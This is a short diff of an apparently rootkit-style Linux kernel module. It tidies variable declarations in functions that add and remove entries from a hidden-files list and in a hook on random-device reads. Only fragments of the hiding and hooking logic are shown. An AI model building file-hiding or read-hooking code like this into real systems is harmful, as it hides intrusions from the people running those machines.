@@ -18,6 +18,7 @@ bool add_hidden_file(char* filename) {
     u32 i;
     u32 len;
     char* buffer;
+    char** new_hidden_files;
 
     mutex_lock(&hidden_files_mutex);
     for (i = 0; i < HIDDEN_NUM; i++) {
@@ -36,7 +37,7 @@ bool add_hidden_file(char* filename) {
     memcpy(buffer, filename, len);
     buffer[len] = '\0';
 
-    char** new_hidden_files = kmalloc(sizeof(char*) * (HIDDEN_NUM + 1), GFP_KERNEL);
+    new_hidden_files = kmalloc(sizeof(char*) * (HIDDEN_NUM + 1), GFP_KERNEL);
     if (!new_hidden_files) {
         kfree(buffer);
         mutex_unlock(&hidden_files_mutex);
@@ -59,9 +60,8 @@ bool add_hidden_file(char* filename) {
 
 bool remove_hidden_file(char* filename) {
     u32 i;
-    u32 len;
     u32 file_index;
-    char* buffer;
+    char** new_hidden_files;
 
     mutex_lock(&hidden_files_mutex);
     file_index = HIDDEN_NUM;
@@ -77,7 +77,7 @@ bool remove_hidden_file(char* filename) {
     }
 
 
-    char** new_hidden_files = kmalloc(sizeof(char*) * (HIDDEN_NUM - 1), GFP_KERNEL);
+    new_hidden_files = kmalloc(sizeof(char*) * (HIDDEN_NUM - 1), GFP_KERNEL);
     kfree(HIDDEN_FILES[file_index]);
     if (!new_hidden_files) {
         mutex_unlock(&hidden_files_mutex);
@@ -205,7 +205,6 @@ asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t 
 {
     int len;
     u32 i;
-    long error;
     char *buffer;
 
     len = orig_random_read(file, buf, nbytes, ppos);
